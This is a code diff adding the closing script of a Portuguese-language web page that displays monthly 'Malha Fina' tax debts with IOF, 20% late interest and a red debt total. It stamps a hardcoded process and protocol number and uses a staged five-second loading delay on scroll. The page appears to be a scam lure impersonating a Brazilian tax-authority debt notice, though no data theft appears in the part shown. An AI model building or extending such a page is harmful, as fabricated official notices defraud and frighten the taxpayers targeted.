+                const mesDiv = document.createElement('div');
+                mesDiv.className = 'bg-white border border-gray-200 p-3 text-sm';
+                mesDiv.innerHTML = `
+                    <h4 class="font-bold text-gray-800 mb-2">${m.mes}</h4>
+                    <div class="flex justify-between mb-1">
+                        <span class="text-gray-600">Malha Fina:</span>
+                        <span class="text-gray-800">R$ ${m.malha.toLocaleString('pt-BR', {minimumFractionDigits: 2})}</span>
+                    </div>
+                    <div class="flex justify-between mb-1">
+                        <span class="text-gray-600">IOF (0,38%):</span>
+                        <span class="text-gray-800">R$ ${m.iof.toLocaleString('pt-BR', {minimumFractionDigits: 2})}</span>
+                    </div>
+                    <div class="flex justify-between mb-1">
+                        <span class="text-gray-600">Juros Mora (20%):</span>
+                        <span class="text-gray-800">R$ ${m.juros.toLocaleString('pt-BR', {minimumFractionDigits: 2})}</span>
+                    </div>
+                    <div class="border-t border-gray-300 my-2"></div>
+                    <div class="flex justify-between">
+                        <span class="font-semibold text-gray-700">Débito:</span>
+                        <span class="font-semibold text-red-600">R$ ${m.debito.toLocaleString('pt-BR', {minimumFractionDigits: 2})}</span>
+                    </div>
+                `;
+                container.appendChild(mesDiv);
+                
+                setTimeout(() => {
+                    mesDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                }, 100);
+            }
+            
+            const processoDiv = document.createElement('div');
+            processoDiv.className = 'text-center py-3 bg-gray-50 border border-gray-200';
+            processoDiv.innerHTML = `<p class="text-xs text-gray-700" style="font-size: 10px;">Processo: <strong>28.1748320184-9284.03</strong> - Protocolo: <strong>DIRPF-101105-2026</strong></p>`;
+            container.appendChild(processoDiv);
+            
+            document.getElementById('spinner-extrato').classList.add('hidden');
+            document.getElementById('total-container').classList.remove('hidden');
+            document.getElementById('notificacao-container').classList.remove('hidden');
+            document.getElementById('footer-container').classList.remove('hidden');
+            
+            const hoje = new Date();
+            const dia = String(hoje.getDate()).padStart(2, '0');
+            const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+            const ano = hoje.getFullYear();
+            document.getElementById('data-desconto').textContent = `${dia}/${mes}/${ano}`;
+        }
+        
+        function verificarScroll() {
+            if (loadingExtratoMostrado) return;
+            
+            const mainPage = document.getElementById('main-page');
+            if (!mainPage.classList.contains('active')) return;
+            
+            const scrollPosition = window.scrollY + window.innerHeight;
+            const pageHeight = document.documentElement.scrollHeight;
+            
+            if (scrollPosition >= pageHeight - 200) {
+                loadingExtratoMostrado = true;
+                document.getElementById('loading-extrato').classList.remove('hidden');
+                setTimeout(() => {
+                    carregarMeses();
+                }, 5000);
+            }
+        }
+        
+        window.addEventListener('scroll', verificarScroll);
+        
+        document.addEventListener('DOMContentLoaded', iniciarCarregamento);
+    </script>
+</body>
+</html>
